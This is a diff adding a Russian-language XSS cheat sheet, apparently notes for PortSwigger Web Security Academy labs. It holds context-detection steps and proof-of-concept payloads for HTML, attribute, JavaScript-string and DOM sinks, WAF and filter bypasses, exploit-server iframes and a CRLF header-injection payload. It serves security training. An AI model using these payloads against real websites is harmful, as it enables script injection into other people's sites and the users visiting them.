@@ -1,0 +1,196 @@
+XSS
+
+1. Главная логика: Как на практике понять, какой способ использовать?
+Вся разведка XSS начинается с одного базового шага:
+
+Отправляете уникальный маркер (например, test1234) в поле поиска, форму комментария или URL-параметр.
+
+Открываете DevTools (F12) -> вкладку Inspector (Ctrl+Shift+C) и ищете, куда именно подставился ваш маркер test1234.
+
+В зависимости от того, ГДЕ и КАК отображается ваш маркер, выбирается вектор:
+
+Контекст 1: Прямо между тегами HTML (например, <h1>0 results for test1234</h1>)
+
+Смотрим: Закодированы ли < и >?
+
+Если НЕТ: Используем классический <script>alert(1)</script>.
+
+Если ДА (превратилось в &lt;script&gt;): Ищем другие контексты (атрибуты, JS).
+
+Контекст 2: Внутри атрибута тега (например, <input value="test1234"> или <a href="test1234">)
+
+Если это value="...": Выходим из атрибута кавычкой " и навешиваем событие (" autofocus onfocus=alert(1) x).
+
+Если это href="...": Внедряем javascript:alert(1).
+
+Контекст 3: Внутри блока JavaScript (например, <script> var search = 'test1234'; </script>)
+
+Даже если < и > кодируются, они здесь не нужны! Закрываем JS-строку кавычкой и исполняем код: ';alert(1);//.
+
+Контекст 4: Вставка через JS на стороне клиента (DOM XSS)
+
+При поиске в исходнике (Ctrl+U) маркера нет, но в DevTools (F12) он есть: Код обрабатывается скриптом браузера.
+
+Проверяем функции (Sinks):
+
+document.write(...) -> закроет текущий тег: "><script>alert(1)</script>.
+
+innerHTML -> <script> не сработает! Нужен тег с ошибкой: <img src=1 onerror=alert(1)>.
+
+$.attr('href', ...) -> передаем javascript:alert(1).
+
+$(location.hash) -> передаем payload через якорь #<img src=1 onerror=alert(1)>.
+
+
+
+
+
+================================================================================
+                         ULTIMATE XSS CHEAT SHEET
+================================================================================
+
+[!] ЭТАП 1: РАЗВЕДКА И ПОИСК ТОЧЕК ВХОДА
+--------------------------------------------------------------------------------
+1. Введите уникальный маркер в каждый параметр ввода (например: "z3nsh3ll").
+2. Нажмите F12 -> Откройте Inspector (Элементы) и найдите, куда попал маркер.
+3. Определите контекст: Между тегами? Внутри атрибута? Внутри блока <script>?
+
+
+[+] СЦЕНАРИЙ А: HTML Context (Между тегами: <div> [ВХОД] </div>)
+--------------------------------------------------------------------------------
+• Условие: Символы < и > НЕ экранируются сервером.
+  Payload: <script>alert(1)</script>
+
+• Условие: Тег <script> режется или срабатывает innerHTML (скрипты не выполняются).
+  Payloads (Картинки и SVG с триггерами ошибок/загрузки):
+  - <img src=x onerror=alert(1)>
+  - <svg onload=alert(1)>
+  - <body onload=alert(1)>
+  - <iframe src="javascript:alert(1)">
+
+
+[+] СЦЕНАРИЙ Б: HTML Attribute Context (Внутри атрибута: <input value="[ВХОД]">)
+--------------------------------------------------------------------------------
+• Условие: Угловые скобки кодируются (&lt; &gt;), но двойные кавычки " разрешены/не экранируются.
+  Стратегия: Выходим из кавычки атрибута и добавляем триггер события (фокус, мышь).
+  Payloads:
+  - " autofocus onfocus=alert(1) x="
+  - " onmouseover=alert(1) x="
+  - " onclick=alert(1) x="
+
+• Специфический атрибут href (<a href="[ВХОД]">):
+  Payload (Использование псевдопротокола):
+  - javascript:alert(1)
+  - javascript:confirm(document.domain)
+
+
+[+] СЦЕНАРИЙ В: JavaScript String Context (Внутри тега <script>: var x = '[ВХОД]';)
+--------------------------------------------------------------------------------
+• Условие: Данные падают внутрь JS-строки. Скобки могут кодироваться, но они и не нужны.
+  Стратегия: Закрыть строковую переменную кавычкой и точкой с запятой, выполнить свой код, закомментировать остаток строки.
+  Payloads:
+  - ';alert(1);//
+  - ";alert(1);//
+  - '-alert(1)-'
+
+
+[+] СЦЕНАРИЙ Г: DOM XSS Sinks (Уязвимые функции на стороне клиента)
+--------------------------------------------------------------------------------
+1. document.write(data)
+   - Вектор: "><script>alert(1)</script>
+   - Вектор: "><img src=x onerror=alert(1)>
+
+2. element.innerHTML = data
+   - Вектор: <img src=x onerror=alert(1)>  (Теги <script> тут не сработают!)
+
+3. jQuery .attr('href', data) / jQuery-селекторы $(data)
+   - Для href: javascript:alert(1)
+   - Для селектора (через хэш #): #<img src=x onerror=alert(1)>
+================================================================================
+
+
+
+
+
+
+
+
+
+
+
+================================================================================
+          ULTIMATE XSS CHEAT SHEET — ПОЛНЫЙ НАБОР (PORTSWIGGER)
+================================================================================
+
+[1] Reflected XSS into HTML context with nothing encoded
+• Как распознать: Ввод попадает прямо между HTML-тегами (например, в поиск), символы < и > не фильтруются.
+• Payload: <script>alert(1)</script>
+
+[2] Stored XSS into HTML context with nothing encoded
+• Как распознать: Ввод сохраняется на сервере (например, в комментариях) и выводится в чистом виде другим пользователям.
+• Payload: <script>alert(1)</script>
+
+[3] DOM XSS in document.write sink using source location.search
+• Как распознать: Параметр из URL (location.search) передается скриптом в функцию document.write().
+• Payload (в URL): /?storeId="><svg onload=alert(1)>
+
+[4] DOM XSS in innerHTML sink using source location.search
+• Как распознать: Поисковый запрос вставляется через element.innerHTML. Теги <script> здесь не выполняются!
+• Payload: <img src=1 onerror=alert(1)>
+
+[5] DOM XSS in jQuery anchor href attribute sink using location.search source
+• Как распознать: jQuery записывает параметр из URL в атрибут href ссылки через .attr('href', ...).
+• Payload (в URL): ?returnUrl=javascript:alert(1)
+
+[6] DOM XSS in jQuery selector sink using a hashchange event
+• Как распознать: Обработчик hashchange передает location.hash в селектор jQuery $(...).
+• Payload (в URL / Exploit Server): #<img src=1 onerror=print()>
+• Пример эксплойта для бота:
+  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+[7] Reflected XSS into attribute with angle brackets HTML-encoded
+• Как распознать: Ввод падает внутрь атрибута (<input value="ВОТ ТУТ">). Угловые скобки кодируются (&lt; &gt;).
+• Payload: " autofocus onfocus=alert(1) x="
+
+[8] Stored XSS into anchor href attribute with double quotes HTML-encoded
+• Как распознать: Ввод попадает в атрибут href ссылки из сохраненных данных. Кавычки кодируются, но протокол не фильтруется.
+• Payload (в поле Website): javascript:alert(1)
+
+[9] Reflected XSS into a JavaScript string with angle brackets HTML encoded
+• Как распознать: Ввод попадает внутрь JS-строки (var x = 'ВОТ ТУТ';). Скобки кодируются, но кавычки разрешены.
+• Payload: '-alert(1)-'  (или ';alert(1)//)
+
+[10] Reflected XSS into HTML context with most untrusted tags blocked
+• Как распознать: Стандартные теги (<script>, <img>) блокируются WAF. Разрешены теги вроде <body>.
+• Payload (через Exploit Server с iframe и изменением размера для триггера onresize):
+  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'"></iframe>
+
+[11] Reflected XSS into HTML context with all tags blocked except custom tags
+• Как распознать: Все стандартные теги запрещены, но кастомные теги (например, <xss>) пропускаются.
+• Payload (через Exploit Server):
+  <script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dprint%28%29+tabindex%3D1%3E#x';</script>
+
+[12] Reflected XSS with event handlers blocked by WAF
+• Как распознать: Тег <svg> разрешен, но стандартные события (onload, onerror) блокируются WAF.
+• Payload: <svg><animatetransform onbegin=alert(1)>
+
+[13] Reflected XSS in canonical link tag
+• Как распознать: В блоке <head> есть тег <link rel="canonical" href="...">, куда напрямую прокидывается путь из URL.
+• Payload (в адресной строке): /'accesskey='x'onclick='alert(1)
+
+[14] Reflected XSS into a JavaScript string with single quote and backslash escaped
+• Как распознать: Одиночные кавычки экранируются сервером через слэш (\'), что ломает попытки закрыть строку.
+• Payload: </script><script>alert(1)</script>
+
+[15] Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quote escaped
+• Как распознать: Внутри JS-строки кавычки экранируются, но можно использовать нейтрализацию слэша или фреймворки.
+• Payload (нейтрализация слэша): \';alert(1)//
+• Payload (Template Literals): ${alert(1)}
+• Payload (AngularJS): {{$on.constructor('alert(1)')()}}
+
+[16] HTTP Response Header Injection / Reflected XSS via Header (с использованием \r\n)
+• Как распознать: Значение из параметров запроса подставляется сервером напрямую в заголовки ответа (например, Location или Set-Cookie). Символы перевода строки не фильтруются.
+• Payload (в Burp Suite Repeater / Proxy):
+  /example%0d%0aSet-Cookie:%20cookie=%3Cscript%3Ealert(1)%3C/script%3E
+• Как это работает: Символы %0d%0a (это URL-кодированные байты \r\n) принудительно завершают текущий заголовок ответа сервера и позволяют внедрить новый заголовок или тело со скриптом.
+================================================================================
